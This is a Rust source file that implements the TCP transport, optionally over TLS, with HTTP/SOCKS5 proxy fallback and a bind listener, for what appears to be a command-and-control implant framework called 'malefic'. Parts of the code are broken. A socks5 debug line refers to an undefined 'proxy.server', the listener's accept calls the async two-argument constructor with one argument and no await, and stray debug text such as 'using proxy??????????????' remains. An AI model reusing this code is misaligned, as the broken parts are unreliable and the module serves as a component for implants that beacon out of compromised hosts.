#[cfg(feature = "tls")]
pub mod tls;

#[cfg(feature = "proxy")]
use crate::config::{USE_ENV_PROXY, PROXY_URL, PROXY_HOST, PROXY_PASSWORD, PROXY_PORT, PROXY_USERNAME};
#[cfg(feature = "proxy")]
use crate::transport::proxie::{Auth, AsyncProxy, HTTPProxy, SOCKS5Proxy};
#[cfg(feature = "proxy")]
use url::Url;
#[cfg(feature = "proxy")]
use std::env;
use crate::transport::{DialerExt, TransportImpl, Stream, TransportError};
use anyhow::Result;
use async_net::TcpStream;
use async_trait::async_trait;
use futures::{AsyncRead, AsyncWrite};
use std::pin::Pin;
use std::task::{Context, Poll};
use malefic_helper::debug;
use malefic_proto::crypto::Cryptor;

#[cfg(feature = "tls")]
pub use tls::TlsConfig;
#[cfg(feature = "tls")]
use async_tls::{client::TlsStream};

pub enum TCPTransport<T: TransportImpl = TcpStream> {
    Plain(T),
    #[cfg(feature = "tls")]
    Tls(TlsStream<T>),

}

impl<T: TransportImpl> TCPTransport<T> {
    /// 创建普通传输（不使用TLS）
    pub fn new_plain(stream: T) -> Self {
        TCPTransport::Plain(stream)
    }
}

impl TCPTransport<TcpStream> {
    /// 创建TCP传输，根据feature自动决定是否使用TLS
    pub async fn new(stream: TcpStream, config: ServerConfig) -> Result<Self> {
        #[cfg(feature = "tls")]
        {
            let tls_config = tls::build_tls_config(config);
            Self::new_with_tls(stream, tls_config).await
        }
        #[cfg(not(feature = "tls"))]
        {
            Ok(TCPTransport::Plain(stream))
        }
    }

    /// 使用指定TLS配置创建TLS传输
    #[cfg(feature = "tls")]
    pub async fn new_with_tls(stream: TcpStream, config: TlsConfig) -> Result<Self> {
        let server_name = if config.server_name.is_empty() {
            "localhost".to_string()
        } else {
            config.server_name.clone()
        };

        debug!("[tls] Connecting to {} with TLS", server_name);

        let connector = tls::TlsConnectorBuilder::new(config).build()?;
        let tls_stream = connector.connect(&server_name, stream).await?;

        debug!("[tls] TLS handshake completed successfully");
        Ok(TCPTransport::Tls(tls_stream))
    }
}

impl<T: TransportImpl> AsyncRead for TCPTransport<T> {
    fn poll_read(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &mut [u8],
    ) -> Poll<Result<usize, std::io::Error>> {
        match &mut *self {
            TCPTransport::Plain(stream) => Pin::new(stream).poll_read(cx, buf),
            #[cfg(feature = "tls")]
            TCPTransport::Tls(tls_stream) => Pin::new(tls_stream).poll_read(cx, buf),
        }
    }
}

impl<T: TransportImpl> AsyncWrite for TCPTransport<T> {
    fn poll_write(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
        buf: &[u8],
    ) -> Poll<Result<usize, std::io::Error>> {
        match &mut *self {
            TCPTransport::Plain(stream) => Pin::new(stream).poll_write(cx, buf),
            #[cfg(feature = "tls")]
            TCPTransport::Tls(tls_stream) => Pin::new(tls_stream).poll_write(cx, buf),
        }
    }

    fn poll_flush(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
    ) -> Poll<Result<(), std::io::Error>> {
        match &mut *self {
            TCPTransport::Plain(stream) => Pin::new(stream).poll_flush(cx),
            #[cfg(feature = "tls")]
            TCPTransport::Tls(tls_stream) => Pin::new(tls_stream).poll_flush(cx),
        }
    }

    fn poll_close(
        mut self: Pin<&mut Self>,
        cx: &mut Context<'_>,
    ) -> Poll<Result<(), std::io::Error>> {
        match &mut *self {
            TCPTransport::Plain(stream) => Pin::new(stream).poll_close(cx),
            #[cfg(feature = "tls")]
            TCPTransport::Tls(tls_stream) => Pin::new(tls_stream).poll_close(cx),
        }
    }
}

#[derive(Clone)]
pub struct TCPClient {
    pub stream: Stream,
}

impl TCPClient {
    pub fn new(cryptor: Cryptor) -> Result<Self> {
        Ok(TCPClient {
            stream: Stream { cryptor },
        })
    }
}

#[async_trait]
impl DialerExt for TCPClient {
    async fn connect(&mut self, config: &ServerConfig) -> Result<TCPTransport<TcpStream>> {
        debug!("using proxy??????????????");
        #[cfg(feature = "socks5_proxy")]{
            debug!("Using proxy", proxy.server);
        }
        let tcp_stream = new_steam(config).await?;
        TCPTransport::new(tcp_stream, config.clone()).await
    }
}

pub async fn new_steam(config: &ServerConfig) -> Result<TcpStream>{
    #[cfg(feature = "proxy")]
    {
        // 三层代理逻辑
        
        // 第一层：如果配置了具体的代理URL，强制使用
        if !PROXY_URL.is_empty() {
            debug!("[tcp] Using configured proxy URL: {}", *PROXY_URL);
            if let Some(stream) = try_proxy_url(&PROXY_URL, &config.address).await {
                return Ok(stream);
            }
            debug!("[tcp] Configured proxy failed, falling back");
        }
        
        // 第二层：如果启用了环境变量代理且没有配置URL，检查环境变量
        if *USE_ENV_PROXY && PROXY_URL.is_empty() {
            debug!("[tcp] Checking environment variables for proxy");
            if let Some(stream) = try_env_proxy(&config.address).await {
                return Ok(stream);
            }
            debug!("[tcp] Environment proxy not found or failed, falling back");
        }
        
        // 第三层：使用编译时配置的代理（向后兼容）
        if !PROXY_HOST.is_empty() && *PROXY_PORT != "0" {
            debug!("[tcp] Using compile-time proxy configuration");
            if let Some(stream) = try_compile_time_proxy(&config.address).await {
                return Ok(stream);
            }
            debug!("[tcp] Compile-time proxy failed, falling back to direct connection");
        }
    }
    
    // 直接连接
    debug!("[tcp] Connecting directly to {}", config.address);
    // TcpStream::connect(config.address.as_str()).await.map_err(|e| anyhow::anyhow!("TCP connect error: {}", e))
    TcpStream::connect(config.address.as_str()).await.map_err(|e| {
        let transport_err = TransportError::from_io_error(&e);
        anyhow::anyhow!(transport_err)
    })
}

/// 尝试使用指定的代理URL
#[cfg(feature = "proxy")]
async fn try_proxy_url(proxy_url: &str, target: &str) -> Option<TcpStream> {
    if let Ok(url) = Url::parse(proxy_url) {
        let host = url.host_str()?.to_string();
        let port = url.port().unwrap_or_else(|| match url.scheme() {
            "http" | "https" => 8080,
            "socks5" | "socks" => 1080,
            _ => 8080,
        });
        
        let auth = if !url.username().is_empty() {
            Auth::new(url.username(), url.password().unwrap_or(""))
        } else {
            None
        };
        
        match url.scheme() {
            "http" | "https" => {
                let proxy = HTTPProxy::new(&host, port, auth);
                proxy.connect(target).await.ok().map(|s| s.into_tcpstream())
            }
            "socks5" | "socks" => {
                let proxy = SOCKS5Proxy::new(&host, port, auth);
                proxy.connect(target).await.ok().map(|s| s.into_tcpstream())
            }
            _ => {
                debug!("[tcp] Unsupported proxy scheme: {}", url.scheme());
                None
            }
        }
    } else {
        debug!("[tcp] Invalid proxy URL: {}", proxy_url);
        None
    }
}

/// 尝试使用环境变量代理
#[cfg(feature = "proxy")]
async fn try_env_proxy(target: &str) -> Option<TcpStream> {
    // 检查 NO_PROXY 环境变量
    if should_skip_proxy(target) {
        return None;
    }
    
    // 检查标准代理环境变量
    let proxy_vars = ["HTTPS_PROXY", "HTTP_PROXY", "SOCKS_PROXY"];
    
    for var_name in &proxy_vars {
        if let Ok(proxy_url_str) = env::var(var_name) {
            debug!("[tcp] Found {} environment variable: {}", var_name, proxy_url_str);
            if let Some(stream) = try_proxy_url(&proxy_url_str, target).await {
                return Some(stream);
            }
        }
    }
    None
}

/// 尝试使用编译时代理配置
#[cfg(feature = "proxy")]
async fn try_compile_time_proxy(target: &str) -> Option<TcpStream> {
    if let Ok(port) = PROXY_PORT.parse::<u16>() {
        let auth = if !PROXY_USERNAME.is_empty() {
            Auth::new(&PROXY_USERNAME, &PROXY_PASSWORD)
        } else {
            None
        };
        
        // 默认使用HTTP代理（向后兼容）
        let proxy = HTTPProxy::new(&PROXY_HOST, port, auth);
        proxy.connect(target).await.ok().map(|s| s.into_tcpstream())
    } else {
        None
    }
}

/// 检查是否应该跳过代理
#[cfg(feature = "proxy")]
fn should_skip_proxy(target: &str) -> bool {
    if let Ok(no_proxy) = env::var("NO_PROXY") {
        let target_host = if let Some(colon_pos) = target.rfind(':') {
            &target[..colon_pos]
        } else {
            target
        }.to_lowercase();
        
        for no_proxy_item in no_proxy.split(',') {
            let item = no_proxy_item.trim().to_lowercase();
            if item.is_empty() {
                continue;
            }
            
            // 完全匹配
            if target_host == item {
                debug!("[tcp] Target {} matches NO_PROXY: {}", target, item);
                return true;
            }
            
            // 域名后缀匹配
            if item.starts_with('.') && target_host.ends_with(&item) {
                debug!("[tcp] Target {} matches NO_PROXY suffix: {}", target, item);
                return true;
            }
            
            // localhost 特殊处理
            if item == "localhost" && (target_host == "localhost" || target_host == "127.0.0.1") {
                debug!("[tcp] Target {} is localhost, skipping proxy", target);
                return true;
            }
        }
    }
    false
}

#[cfg(feature = "bind")]
use crate::transport::ListenerExt;
#[cfg(feature = "bind")]
use async_net::TcpListener;
use crate::config::ServerConfig;

#[cfg(feature = "bind")]
pub struct TCPListenerExt {
    listener: TcpListener,
}

#[cfg(feature = "bind")]
#[async_trait]
impl ListenerExt for TCPListenerExt {
    async fn bind(addr: &str) -> Result<Self> {
        let listener = TcpListener::bind(addr).await?;
        Ok(TCPListenerExt { listener })
    }

    async fn accept(&mut self) -> Result<TCPTransport> {
        let (stream, _addr) = self.listener.accept().await?;
        Ok(TCPTransport::new(stream))
    }
}
